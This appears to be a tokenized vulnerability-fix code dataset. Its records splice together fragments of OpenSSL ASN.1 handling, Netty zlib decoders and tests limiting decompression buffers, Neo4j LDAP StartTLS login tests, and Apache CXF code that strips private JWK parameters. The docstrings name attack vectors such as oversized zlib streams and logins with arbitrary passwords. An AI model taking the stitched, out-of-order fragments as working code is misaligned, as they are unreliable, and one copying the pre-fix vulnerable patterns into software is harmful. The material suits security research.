"NUL", "-", "terminated", ".", "*", "/", "if", "(", "buf", "&", "&", "buf_len", ">", "0", ")", "buf", "[", "0", "]", "=", "'", "\\", "0", "'", ";", "if", "(", "(", "a", "=", "=", "NULL", ")", "|", "|", "(", "a", "-", ">", "data", "=", "=", "NULL", ")", ")", "return", "(", "0", ")", ";", "if", "(", "buf", "&", "&", "(", "buf_len", ">", "1", ")", ")", "*", "buf", "=", "'", "\\", "0", "'", ";", "if", "(", "buf_len", ">", "1", ")", "*", "buf", "=", "'", "\\", "0", "'", ";</s>int", "i", ";", "/", "*", "Sanity", "check", "OID", "encoding", ":", "can", "'", "t", "have", "leading", "0x80", "in", "*", "subidentifiers", ",", "see", ":", "X", ".", "690", "8", ".", "19", ".", "2", "for", "(", "i", "=", "0", ",", "p", "=", "*", "pp", ";", "i", "<", "len", ";", "i", "+", "+,", "p", "+", "+)", "if", "(", "(", "data", "=", "=", "NULL", ")", "|", "|", "(", "ret", "-", ">", "length", "<", "len", ")", ")", "data", "=", "(", "unsigned", "char", "*", ")", "OPENSSL_malloc", "(", "len", "?", "(", "int", ")", "len", ":", "1", ")", ";", "memcpy", "(", "data", ",", "p", ",", "(", "int", ")", "len", ")", ";", "ret", "-", ">", "length", "=", "(", "int", ")", "len", ";", "p", "+", "=", "len", ";", "if", "(", "(", "a", "=", "=", "NULL", ")", "|", "|", "(", "a", "-", ">", "data", "=", "=", "NULL", ")", ")", "{", "buf", "[", "0", "]", "='", "\\", "0", "'", ";", "return", "(", "0", ")", ";", "}", "if", "(", "buf", "&", "&", "(", "buf_len", ">", "0", ")", ")", "if", "(", "buf_len", ">", "0", ")"], "docstring_tokens": ["the", "memory", "leak", "described", "above)"]}
{"contents": ["empty"], "code_tokens": ["import", "io", ".", "netty", ".", "buffer", ".", "ByteBufAllocator", ";", "this", "(", "ZlibWrapper", ".", "ZLIB", ",", "0", ")", ";", "}", "/", "**", "*", "Creates", "a", "new", "instance", "with", "the", "default", "wrapper", "(", "{@", "link", "ZlibWrapper", "#", "ZLIB", "}", ")", "*", "and", "specified", "maximum", "buffer", "allocation", ".", "*", "*", "@", "param", "maxAllocation", "*", "Maximum", "size", "of", "the", "decompression", "buffer", ".", "Must", "be", "&", "gt", ";", "=", "0", ".", "*", "If", "zero", ",", "maximum", "size", "is", "decided", "by", "the", "{", "@", "link", "ByteBufAllocator", "}", ".", "*", "*", "@", "throws", "DecompressionException", "if", "failed", "to", "initialize", "zlib", "*", "/", "public", "JZlibDecoder", "(", "int", "maxAllocation", ")", "{", "this", "(", "ZlibWrapper", ".", "ZLIB", ",", "maxAllocation", ")", ";", "this", "(", "wrapper", ",", "0", ")", ";", "}", "/", "**", "*", "Creates", "a", "new", "instance", "with", "the", "specified", "wrapper", "and", "maximum", "buffer", "allocation", ".", "*", "*", "@", "param", "maxAllocation", "*", "Maximum", "size", "of", "the", "decompression", "buffer", ".", "Must", "be", "&", "gt", ";", "=", "0", ".", "*", "If", "zero", ",", "maximum", "size", "is", "decided", "by", "the", "{", "@", "link", "ByteBufAllocator", "}", ".", "*", "*", "@", "throws", "DecompressionException", "if", "failed", "to", "initialize", "zlib", "*", "/", "public", "JZlibDecoder", "(", "ZlibWrapper", "wrapper", ",", "int", "maxAllocation", ")", "{", "super", "(", "maxAllocation", ")", ";", "this", "(", "dictionary", ",", "0", ")", ";", "}", "/", "**", "*", "Creates", "a", "new", "instance", "with", "the", "specified", "preset", "dictionary", "and", "maximum", "buffer", "allocation", ".", "*", "The", "wrapper", "is", "always", "{", "@", "link", "ZlibWrapper", "#", "ZLIB", "}", "because", "it", "is", "the", "only", "format", "that", "*", "supports", "the", "preset", "dictionary", ".", "*", "*", "@", "param", "maxAllocation", "*", "Maximum", "size", "of", "the", "decompression", "buffer", ".", "Must", "be", "&", "gt", ";", "=", "0", ".", "*", "If", "zero", ",", "maximum", "size", "is", "decided", "by", "the", "{", "@", "link", "ByteBufAllocator", "}", ".", "*", "*", "@", "throws", "DecompressionException", "if", "failed", "to", "initialize", "zlib", "*", "/", "public", "JZlibDecoder", "(", "byte", "[", "]", "dictionary", ",", "int", "maxAllocation", ")", "{", "super", "(", "maxAllocation", ")", ";", "this", ".", "dictionary", "=", "requireNonNull", "(", "dictionary", ",", "\"", "dictionary", "\"", ");", "ByteBuf", "decompressed", "=", "prepareDecompressBuffer", "(", "ctx", ",", "null", ",", "inputLength", "<", "<", "1", ")", ";", "decompressed", "=", "prepareDecompressBuffer", "(", "ctx", ",", "decompressed", ",", "z", ".", "avail_in", "<", "<", "1", ")", ";", "@", "Override", "protected", "void", "decompressionBufferExhausted", "(", "ByteBuf", "buffer", ")", "{", "finished", "=", "true", ";", "}", "import", "io", ".", "netty", ".", "buffer", ".", "ByteBufAllocator", ";", "this", "(", "ZlibWrapper", ".", "ZLIB", ",", "null", ",", "false", ",", "0", ")", ";", "}", "/", "**", "*", "Creates", "a", "new", "instance", "with", "the", "default", "wrapper", "(", "{@", "link", "ZlibWrapper", "#", "ZLIB", "}", ")", "*", "and", "the", "specified", "maximum", "buffer", "allocation", ".", "*", "*", "@", "param", "maxAllocation", "*", "Maximum", "size", "of", "the", "decompression", "buffer", ".", "Must", "be", "&", "gt", ";", "=", "0", ".", "*", "If", "zero", ",", "maximum", "size", "is", "decided", "by", "the", "{", "@", "link", "ByteBufAllocator", "}", ".", "*", "/", "public", "JdkZlibDecoder", "(", "int", "maxAllocation", ")", "{", "this", "(", "ZlibWrapper", ".", "ZLIB", ",", "null", ",", "false", ",", "maxAllocation", ")", ";", "this", "(", "ZlibWrapper", ".", "ZLIB", ",", "dictionary", ",", "false", ",", "0", ")", ";", "}", "/", "**", "*", "Creates", "a", "new", "instance", "with", "the", "specified", "preset", "dictionary", "and", "maximum", "buffer", "allocation", ".", "*", "The", "wrapper", "is", "always", "{", "@", "link", "ZlibWrapper", "#", "ZLIB", "}", "because", "it", "is", "the", "only", "format", "that", "*", "supports", "the", "preset", "dictionary", ".", "*", "*", "@", "param", "maxAllocation", "*", "Maximum", "size", "of", "the", "decompression", "buffer", ".", "Must", "be", "&", "gt", ";", "=", "0", ".", "*", "If", "zero", ",", "maximum", "size", "is", "decided", "by", "the", "{", "@", "link", "ByteBufAllocator", "}", ".", "*", "/", "public", "JdkZlibDecoder", "(", "byte", "[", "]", "dictionary", ",", "int", "maxAllocation", ")", "{", "this", "(", "ZlibWrapper", ".", "ZLIB", ",", "dictionary", ",", "false", ",", "maxAllocation", ")", ";", "this", "(", "wrapper", ",", "null", ",", "false", ",", "0", ")", ";", "}", "/", "**", "*", "Creates", "a", "new", "instance", "with", "the", "specified", "wrapper", "and", "maximum", "buffer", "allocation", ".", "*", "Be", "aware", "that", "only", "{", "@", "link", "ZlibWrapper", "#", "GZIP", "}", ",", "{", "@", "link", "ZlibWrapper", "#", "ZLIB", "}", "and", "{", "@", "link", "ZlibWrapper", "#", "NONE", "}", "are", "*", "supported", "atm", ".", "*", "*", "@", "param", "maxAllocation", "*", "Maximum", "size", "of", "the", "decompression", "buffer", ".", "Must", "be", "&", "gt", ";", "=", "0", ".", "*", "If", "zero", ",", "maximum", "size", "is", "decided", "by", "the", "{", "@", "link", "ByteBufAllocator", "}", ".", "*", "/", "public", "JdkZlibDecoder", "(", "ZlibWrapper", "wrapper", ",", "int", "maxAllocation", ")", "{", "this", "(", "wrapper", ",", "null", ",", "false", ",", "maxAllocation", ")", ";", "this", "(", "wrapper", ",", "null", ",", "decompressConcatenated", ",", "0", ")", ";", "}", "public", "JdkZlibDecoder", "(", "ZlibWrapper", "wrapper", ",", "boolean", "decompressConcatenated", ",", "int", "maxAllocation", ")", "{", "this", "(", "wrapper", ",", "null", ",", "decompressConcatenated", ",", "maxAllocation", ")", ";", "this", "(", "ZlibWrapper", ".", "GZIP", ",", "null", ",", "decompressConcatenated", ",", "0", ")", ";", "}", "public", "JdkZlibDecoder", "(", "boolean", "decompressConcatenated", ",", "int", "maxAllocation", ")", "{", "this", "(", "ZlibWrapper", ".", "GZIP", ",", "null", ",", "decompressConcatenated", ",", "maxAllocation", ")", ";", "private", "JdkZlibDecoder", "(", "ZlibWrapper", "wrapper", ",", "byte", "[", "]", "dictionary", ",", "boolean", "decompressConcatenated", ",", "int", "maxAllocation", ")", "{", "super", "(", "maxAllocation", ")", ";", "ByteBuf", "decompressed", "=", "prepareDecompressBuffer", "(", "ctx", ",", "null", ",", "inflater", ".", "getRemaining", "(", ")", "<", "<", "1", ")", ";", "decompressed", "=", "prepareDecompressBuffer", "(", "ctx", ",", "decompressed", ",", "inflater", ".", "getRemaining", "(", ")", "<", "<", "1", ")", ";", "@", "Override", "protected", "void", "decompressionBufferExhausted", "(", "ByteBuf", "buffer", ")", "{", "finished", "=", "true", ";", "}", "import", "io", ".", "netty", ".", "buffer", ".", "ByteBufAllocator", ";", "import", "io", ".", "netty", ".", "channel", ".", "ChannelHandlerContext", ";", "/", "**", "*", "Maximum", "allowed", "size", "of", "the", "decompression", "buffer", ".", "*", "/", "protected", "final", "int", "maxAllocation", ";", "/", "**", "*", "Same", "as", "{", "@", "link", "#", "ZlibDecoder", "(", "int", ")", "}", "with", "maxAllocation", "=", "0", ".", "*", "/", "public", "ZlibDecoder", "(", ")", "{", "this", "(", "0", ")", ";", "}", "/", "**", "*", "Construct", "a", "new", "ZlibDecoder", ".", "*", "@", "param", "maxAllocation", "*", "Maximum", "size", "of", "the", "decompression", "buffer", ".", "Must", "be", "&", "gt", ";", "=", "0", ".", "*", "If", "zero", ",", "maximum", "size", "is", "decided", "by", "the", "{", "@", "link", "ByteBufAllocator", "}", ".", "*", "/", "public", "ZlibDecoder", "(", "int", "maxAllocation", ")", "{", "if", "(", "maxAllocation", "<", "0", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "maxAllocation", "must", "be", ">", "=", "0", "\"", ");", "}", "this", ".", "maxAllocation", "=", "maxAllocation", ";", "}", "/", "**", "*", "Allocate", "or", "expand", "the", "decompression", "buffer", ",", "without", "exceeding", "the", "maximum", "allocation", ".", "*", "Calls", "{", "@", "link", "#", "decompressionBufferExhausted", "(", "ByteBuf", ")", "}", "if", "the", "buffer", "is", "full", "and", "cannot", "be", "expanded", "further", ".", "*", "/", "protected", "ByteBuf", "prepareDecompressBuffer", "(", "ChannelHandlerContext", "ctx", ",", "ByteBuf", "buffer", ",", "int", "preferredSize", ")", "{", "if", "(", "buffer", "=", "=", "null", ")", "{", "if", "(", "maxAllocation", "=", "=", "0", ")", "{", "return", "ctx", ".", "alloc", "(", ").", "heapBuffer", "(", "preferredSize", ")", ";", "}", "return", "ctx", ".", "alloc", "(", ").", "heapBuffer", "(", "Math", ".", "min", "(", "preferredSize", ",", "maxAllocation", ")", ",", "maxAllocation", ")", ";", "}", "/", "/", "this", "always", "expands", "the", "buffer", "if", "possible", ",", "even", "if", "the", "expansion", "is", "less", "than", "preferredSize", "/", "/", "we", "throw", "the", "exception", "only", "if", "the", "buffer", "could", "not", "be", "expanded", "at", "all", "/", "/", "this", "means", "that", "one", "final", "attempt", "to", "deserialize", "will", "always", "be", "made", "with", "the", "buffer", "at", "maxAllocation", "if", "(", "buffer", ".", "ensureWritable", "(", "preferredSize", ",", "true", ")", "=", "=", "1", ")", "{", "/", "/", "buffer", "must", "be", "consumed", "so", "subclasses", "don", "'", "t", "add", "it", "to", "output", "/", "/", "we", "therefore", "duplicate", "it", "when", "calling", "decompressionBufferExhausted", "(", ")", "to", "guarantee", "non", "-", "interference", "/", "/", "but", "wait", "until", "after", "to", "consume", "it", "so", "the", "subclass", "can", "tell", "how", "much", "output", "is", "really", "in", "the", "buffer", "decompressionBufferExhausted", "(", "buffer", ".", "duplicate", "(", "))", ";", "buffer", ".", "skipBytes", "(", "buffer", ".", "readableBytes", "(", "))", ";", "throw", "new", "DecompressionException", "(", "\"", "Decompression", "buffer", "has", "reached", "maximum", "size", ":", "\"", "+", "buffer", ".", "maxCapacity", "(", "))", ";", "}", "return", "buffer", ";", "}", "/", "**", "*", "Called", "when", "the", "decompression", "buffer", "cannot", "be", "expanded", "further", ".", "*", "Default", "implementation", "is", "a", "no", "-", "op", ",", "but", "subclasses", "can", "override", "in", "case", "they", "want", "to", "*", "do", "something", "before", "the", "{", "@", "link", "DecompressionException", "}", "is", "thrown", ",", "such", "as", "log", "the", "*", "data", "that", "was", "decompressed", "so", "far", ".", "*", "/", "protected", "void", "decompressionBufferExhausted", "(", "ByteBuf", "buffer", ")", "{", "}", "protected", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ",", "int", "maxAllocation", ")", "{", "return", "new", "JZlibDecoder", "(", "wrapper", ",", "maxAllocation", ")", ";", "protected", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ",", "int", "maxAllocation", ")", "{", "return", "new", "JdkZlibDecoder", "(", "wrapper", ",", "maxAllocation", ")", ";", "protected", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ",", "int", "maxAllocation", ")", "{", "return", "new", "JZlibDecoder", "(", "wrapper", ",", "maxAllocation", ")", ";", "protected", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ",", "int", "maxAllocation", ")", "{", "return", "new", "JdkZlibDecoder", "(", "wrapper", ",", "maxAllocation", ")", ";", "import", "io", ".", "netty", ".", "buffer", ".", "AbstractByteBufAllocator", ";", "import", "io", ".", "netty", ".", "buffer", ".", "ByteBufAllocator", ";", "protected", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ")", "{", "return", "createDecoder", "(", "wrapper", ",", "0", ")", ";", "}", "protected", "abstract", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ",", "int", "maxAllocation", ")", ";", "@", "Test", "public", "void", "testMaxAllocation", "(", ")", "throws", "Exception", "{", "int", "maxAllocation", "=", "1024", ";", "ZlibDecoder", "decoder", "=", "createDecoder", "(", "ZlibWrapper", ".", "ZLIB", ",", "maxAllocation", ")", ";", "EmbeddedChannel", "chDecoder", "=", "new", "EmbeddedChannel", "(", "decoder", ")", ";", "TestByteBufAllocator", "alloc", "=", "new", "TestByteBufAllocator", "(", "chDecoder", ".", "alloc", "(", "))", ";", "chDecoder", ".", "config", "(", ").", "setAllocator", "(", "alloc", ")", ";", "try", "{", "chDecoder", ".", "writeInbound", "(", "Unpooled", ".", "wrappedBuffer", "(", "deflate", "(", "BYTES_LARGE", ")", "))", ";", "fail", "(", "\"", "decompressed", "size", ">", "maxAllocation", ",", "so", "should", "have", "thrown", "exception", "\"", ");", "}", "catch", "(", "DecompressionException", "e", ")", "{", "assertTrue", "(", "e", ".", "getMessage", "(", ").", "startsWith", "(", "\"", "Decompression", "buffer", "has", "reached", "maximum", "size", "\"", "))", ";", "assertEquals", "(", "maxAllocation", ",", "alloc", ".", "getMaxAllocation", "(", "))", ";", "assertTrue", "(", "decoder", ".", "isClosed", "(", "))", ";", "assertFalse", "(", "chDecoder", ".", "finish", "(", "))", ";", "}", "}", "private", "static", "final", "class", "TestByteBufAllocator", "extends", "AbstractByteBufAllocator", "{", "private", "ByteBufAllocator", "wrapped", ";", "private", "int", "maxAllocation", ";", "TestByteBufAllocator", "(", "ByteBufAllocator", "wrapped", ")", "{", "this", ".", "wrapped", "=", "wrapped", ";", "}", "public", "int", "getMaxAllocation", "(", ")", "{", "return", "maxAllocation", ";", "}", "@", "Override", "public", "boolean", "isDirectBufferPooled", "(", ")", "{", "return", "wrapped", ".", "isDirectBufferPooled", "(", ");", "}", "@", "Override", "protected", "ByteBuf", "newHeapBuffer", "(", "int", "initialCapacity", ",", "int", "maxCapacity", ")", "{", "maxAllocation", "=", "Math", ".", "max", "(", "maxAllocation", ",", "maxCapacity", ")", ";", "return", "wrapped", ".", "heapBuffer", "(", "initialCapacity", ",", "maxCapacity", ")", ";", "}", "@", "Override", "protected", "ByteBuf", "newDirectBuffer", "(", "int", "initialCapacity", ",", "int", "maxCapacity", ")", "{", "maxAllocation", "=", "Math", ".", "max", "(", "maxAllocation", ",", "maxCapacity", ")", ";", "return", "wrapped", ".", "directBuffer", "(", "initialCapacity", ",", "maxCapacity", ")", ";", "}", "}</s>this", "(", "ZlibWrapper", ".", "ZLIB", ")", ";", "requireNonNull", "(", "dictionary", ",", "\"", "dictionary", "\"", ");", "this", ".", "dictionary", "=", "dictionary", ";", "ByteBuf", "decompressed", "=", "ctx", ".", "alloc", "(", ").", "heapBuffer", "(", "inputLength", "<", "<", "1", ")", ";", "decompressed", ".", "ensureWritable", "(", "z", ".", "avail_in", "<", "<", "1", ")", ";", "this", "(", "ZlibWrapper", ".", "ZLIB", ",", "null", ",", "false", ")", ";", "this", "(", "ZlibWrapper", ".", "ZLIB", ",", "dictionary", ",", "false", ")", ";", "this", "(", "wrapper", ",", "null", ",", "false", ")", ";", "this", "(", "wrapper", ",", "null", ",", "decompressConcatenated", ")", ";", "this", "(", "ZlibWrapper", ".", "GZIP", ",", "null", ",", "decompressConcatenated", ")", ";", "private", "JdkZlibDecoder", "(", "ZlibWrapper", "wrapper", ",", "byte", "[", "]", "dictionary", ",", "boolean", "decompressConcatenated", ")", "{", "ByteBuf", "decompressed", "=", "ctx", ".", "alloc", "(", ").", "heapBuffer", "(", "inflater", ".", "getRemaining", "(", ")", "<", "<", "1", ")", ";", "decompressed", ".", "ensureWritable", "(", "inflater", ".", "getRemaining", "(", ")", "<", "<", "1", ")", ";", "protected", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ")", "{", "return", "new", "JZlibDecoder", "(", "wrapper", ")", ";", "protected", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ")", "{", "return", "new", "JdkZlibDecoder", "(", "wrapper", ")", ";", "protected", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ")", "{", "return", "new", "JZlibDecoder", "(", "wrapper", ")", ";", "protected", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ")", "{", "return", "new", "JdkZlibDecoder", "(", "wrapper", ")", ";", "protected", "abstract", "ZlibDecoder", "createDecoder", "(", "ZlibWrapper", "wrapper", ")", ";"], "docstring_tokens": ["sending", "a", "large", "ZlibEncoded", "byte", "stream"]}
{"contents": ["empty"], "code_tokens": ["/", "/", "do", "a", "lookup", "of", "the", "user", "to", "trigger", "authentication", "ctx", ".", "lookup", "(", "principal", ".", "toString", "(", ")", ")", ";", "@", "Test", "public", "void", "shouldFailLoginWrongPasswordWithLdapOnlyUsingStartTls", "(", ")", "throws", "Throwable", "{", "getLdapServer", "(", ").", "setConfidentialityRequired", "(", "true", ")", ";", "try", "(", "EmbeddedTestCertificates", "ignore", "=", "new", "EmbeddedTestCertificates", "(", ")", ")", "{", "/", "/", "When", "restartNeo4jServerWithOverriddenSettings", "(", "ldapOnlyAuthSettings", ".", "andThen", "(", "settings", "-", ">", "{", "settings", ".", "put", "(", "SecuritySettings", ".", "ldap_server", ",", "\"", "localhost", ":", "10389", "\"", ")", ";", "settings", ".", "put", "(", "SecuritySettings", ".", "ldap_use_starttls", ",", "\"", "true", "\"", ")", ";", "}", ")", ")", ";", "/", "/", "Then", "assertAuthFail", "(", "\"", "neo", "\"", ",", "\"", "wrong", "\"", ")", ";", "}", "}", "@", "Test", "public", "void", "shouldFailLoginWrongPasswordWithLdapUserContextUsingStartTls", "(", ")", "throws", "Throwable", "{", "getLdapServer", "(", ").", "setConfidentialityRequired", "(", "true", ")", ";", "try", "(", "EmbeddedTestCertificates", "ignore", "=", "new", "EmbeddedTestCertificates", "(", ")", ")", "{", "/", "/", "When", "restartNeo4jServerWithOverriddenSettings", "(", "ldapOnlyAuthSettings", ".", "andThen", "(", "settings", "-", ">", "{", "settings", ".", "put", "(", "SecuritySettings", ".", "ldap_authorization_use_system_account", ",", "\"", "false", "\"", ")", ";", "settings", ".", "put", "(", "SecuritySettings", ".", "ldap_server", ",", "\"", "localhost", ":", "10389", "\"", ")", ";", "settings", ".", "put", "(", "SecuritySettings", ".", "ldap_use_starttls", ",", "\"", "true", "\"", ")", ";", "}", ")", ")", ";", "/", "/", "Then", "assertAuthFail", "(", "\"", "neo", "\"", ",", "\"", "wrong", "\"", ")", ";", "}", "}</s>"], "docstring_tokens": ["by", "sending", "any", "valid", "username", "with", "an", "arbitrary", "password", "."]}
{"contents": ["empty"], "code_tokens": ["public", "JsonWebKeys", "(", "List", "<", "JsonWebKey", ">", "keys", ")", "{", "setKeys", "(", "keys", ")", ";", "}", "import", "java", ".", "util", ".", "Iterator", ";", "return", "loadJsonWebKeys", "(", "m", ",", "props", ",", "keyOper", ",", "cb", ")", ";", "}", "public", "static", "List", "<", "JsonWebKey", ">", "loadJsonWebKeys", "(", "Message", "m", ",", "Properties", "props", ",", "KeyOperation", "keyOper", ",", "PrivateKeyPasswordProvider", "cb", ")", "{", "public", "static", "List", "<", "JsonWebKey", ">", "stripPrivateParameters", "(", "List", "<", "JsonWebKey", ">", "keys", ")", "{", "if", "(", "keys", "=", "=", "null", ")", "{", "return", "Collections", ".", "emptyList", "(", ");", "}", "List", "<", "JsonWebKey", ">", "parsedKeys", "=", "new", "ArrayList", "<", ">(", "keys", ".", "size", "(", "))", ";", "Iterator", "<", "JsonWebKey", ">", "iter", "=", "keys", ".", "iterator", "(", ");", "while", "(", "iter", ".", "hasNext", "(", "))", "{", "JsonWebKey", "key", "=", "iter", ".", "next", "(", ");", "if", "(", "!(", "key", ".", "containsProperty", "(", "\"", "k", "\"", ")", "|", "|", "key", ".", "getKeyType", "(", ")", "=", "=", "KeyType", ".", "OCTET", ")", ")", "{", "/", "/", "We", "don", "'", "t", "allow", "secret", "keys", "in", "a", "public", "keyset", "key", ".", "removeProperty", "(", "JsonWebKey", ".", "RSA_PRIVATE_EXP", ")", ";", "key", ".", "removeProperty", "(", "JsonWebKey", ".", "RSA_FIRST_PRIME_FACTOR", ")", ";", "key", ".", "removeProperty", "(", "JsonWebKey", ".", "RSA_SECOND_PRIME_FACTOR", ")", ";", "key", ".", "removeProperty", "(", "JsonWebKey", ".", "RSA_FIRST_PRIME_CRT", ")", ";", "key", ".", "removeProperty", "(", "JsonWebKey", ".", "RSA_SECOND_PRIME_CRT", ")", ";", "key", ".", "removeProperty", "(", "JsonWebKey", ".", "RSA_FIRST_CRT_COEFFICIENT", ")", ";", "parsedKeys", ".", "add", "(", "key", ")", ";", "}", "}", "return", "parsedKeys", ";", "}", "import", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "common", ".", "JoseException", ";", "}", "boolean", "includeCert", "=", "boolean", "includeCertSha1", "=", "boolean", "includeCertSha256", "=", "boolean", "includePublicKey", "=", "JoseUtils", ".", "checkBooleanProperty", "(", "headers", ",", "props", ",", "m", ",", "}", "@", "Deprecated", "return", "loadPublicVerificationKeys", "(", "m", ",", "props", ",", "true", ")", ";", "}", "public", "static", "JsonWebKeys", "loadPublicVerificationKeys", "(", "Message", "m", ",", "Properties", "props", ",", "boolean", "stripPrivateParameters", ")", "{", "List", "<", "JsonWebKey", ">", "jsonWebKeys", "=", "JwkUtils", ".", "loadJsonWebKeys", "(", "m", ",", "props", ",", "KeyOperation", ".", "SIGN", ",", "null", ")", ";", "if", "(", "jsonWebKeys", "=", "=", "null", "|", "|", "jsonWebKeys", ".", "isEmpty", "(", "))", "{", "throw", "new", "JoseException", "(", "\"", "Error", "loading", "keys", "\"", ");", "}", "return", "new", "JsonWebKeys", "(", "stripPrivateParameters", "?", "JwkUtils", ".", "stripPrivateParameters", "(", "jsonWebKeys", ")", ":", "jsonWebKeys", ")", ";", "JsonWebKeys", "keySet", "=", "JwsUtils", ".", "loadPublicVerificationKeys", "(", "createMessage", "(", "),", "p", ",", "true", ")", ";", "JsonWebKeys", "keySet", "=", "JwsUtils", ".", "loadPublicVerificationKeys", "(", "createMessage", "(", "),", "p", ",", "true", ")", ";", "private", "boolean", "stripPrivateParameters", "=", "true", ";", "keySet", "=", "getFromLocalStore", "(", "stripPrivateParameters", ")", ";", "private", "static", "JsonWebKeys", "getFromLocalStore", "(", "boolean", "stripPrivateParameters", ")", "{", "return", "JwsUtils", ".", "loadPublicVerificationKeys", "(", "JAXRSUtils", ".", "getCurrentMessage", "(", "),", "props", ",", "stripPrivateParameters", ")", ";", "public", "boolean", "isStripPrivateParameters", "(", ")", "{", "return", "stripPrivateParameters", ";", "}", "/", "**", "*", "Whether", "to", "strip", "private", "parameters", "from", "the", "keys", "that", "are", "returned", ".", "The", "default", "is", "true", ".", "*", "/", "public", "void", "setStripPrivateParameters", "(", "boolean", "stripPrivateParameters", ")", "{", "this", ".", "stripPrivateParameters", "=", "stripPrivateParameters", ";", "}", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "*", "or", "more", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "*", "distributed", "with", "this", "work", "for", "additional", "information", "*", "regarding", "copyright", "ownership", ".", "The", "ASF", "licenses", "this", "file", "*", "to", "you", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "*", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "*", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "*", "software", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "*", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "*", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "License", "for", "the", "*", "specific", "language", "governing", "permissions", "and", "limitations", "*", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "cxf", ".", "systest", ".", "jaxrs", ".", "security", ".", "oidc", ";", "import", "java", ".", "net", ".", "URL", ";", "import", "javax", ".", "ws", ".", "rs", ".", "core", ".", "Response", ";", "import", "org", ".", "apache", ".", "cxf", ".", "jaxrs", ".", "client", ".", "WebClient", ";", "import", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "jwk", ".", "JsonWebKey", ";", "import", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "jwk", ".", "JsonWebKeys", ";", "import", "org", ".", "apache", ".", "cxf", ".", "rs", ".", "security", ".", "jose", ".", "jwk", ".", "KeyType", ";", "import", "org", ".", "apache", ".", "cxf", ".", "systest", ".", "jaxrs", ".", "security", ".", "SecurityTestUtil", ";", "import", "org", ".", "apache", ".", "cxf", ".", "systest", ".", "jaxrs", ".", "security", ".", "oauth2", ".", "common", ".", "OAuth2TestUtils", ";", "import", "org", ".", "apache", ".", "cxf", ".", "testutil", ".", "common", ".", "AbstractBusClientServerTestBase", ";", "import", "org", ".", "junit", ".", "AfterClass", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "/", "**", "*", "Some", "tests", "for", "the", "OIDC", "Keys", "Service", "*", "/", "public", "class", "OIDCKeysServiceTest", "extends", "AbstractBusClientServerTestBase", "{", "private", "static", "final", "SpringBusTestServer", "JCACHE_SERVER", "=", "new", "SpringBusTestServer", "(", "\"", "oidc", "-", "keys", "-", "jcache", "\"", ");", "@", "BeforeClass", "public", "static", "void", "startServers", "(", ")", "throws", "Exception", "{", "assertTrue", "(", "\"", "Server", "failed", "to", "launch", "\"", ",", "launchServer", "(", "JCACHE_SERVER", ")", ");", "}", "@", "AfterClass", "public", "static", "void", "cleanup", "(", ")", "throws", "Exception", "{", "SecurityTestUtil", ".", "cleanup", "(", ");", "}", "@", "org", ".", "junit", ".", "Test", "public", "void", "testGetRSAPublicKey", "(", ")", "throws", "Exception", "{", "URL", "busFile", "=", "OIDCFlowTest", ".", "class", ".", "getResource", "(", "\"", "client", ".", "xml", "\"", ");", "String", "address", "=", "\"", "https", ":", "//", "localhost", ":", "\"", "+", "JCACHE_SERVER", ".", "getPort", "(", ")", "+", "\"", "/", "services", "/", "\";", "WebClient", "client", "=", "WebClient", ".", "create", "(", "address", ",", "OAuth2TestUtils", ".", "setupProviders", "(", "),", "\"", "alice", "\"", ",", "\"", "security", "\"", ",", "busFile", ".", "toString", "(", "))", ";", "client", ".", "accept", "(", "\"", "application", "/", "json", "\"", ");", "client", ".", "path", "(", "\"", "keys", "/", "\")", ";", "Response", "response", "=", "client", ".", "get", "(", ");", "JsonWebKeys", "jsonWebKeys", "=", "response", ".", "readEntity", "(", "JsonWebKeys", ".", "class", ")", ";", "assertEquals", "(", "1", ",", "jsonWebKeys", ".", "getKeys", "(", ").", "size", "(", "))", ";", "JsonWebKey", "jsonWebKey", "=", "jsonWebKeys", ".", "getKeys", "(", ").", "get", "(", "0", ")", ";", "assertEquals", "(", "KeyType", ".", "RSA", ",", "jsonWebKey", ".", "getKeyType", "(", "))", ";", "assertEquals", "(", "\"", "alice", "\"", ",", "jsonWebKey", ".", "getKeyId", "(", "))", ";", "assertNotNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "n", "\"", "))", ";", "assertNotNull", "(", "jsonWebKey", ".", "getProperty", "(", "\"", "e", "\"", "))", ";", "/", "/", "Check", "we", "don", "'", "t", "send", "the", "private", "key", "back", "checkPrivateKeyParametersNotPresent", "(", "jsonWebKeys", ")", ";", "}", "@", 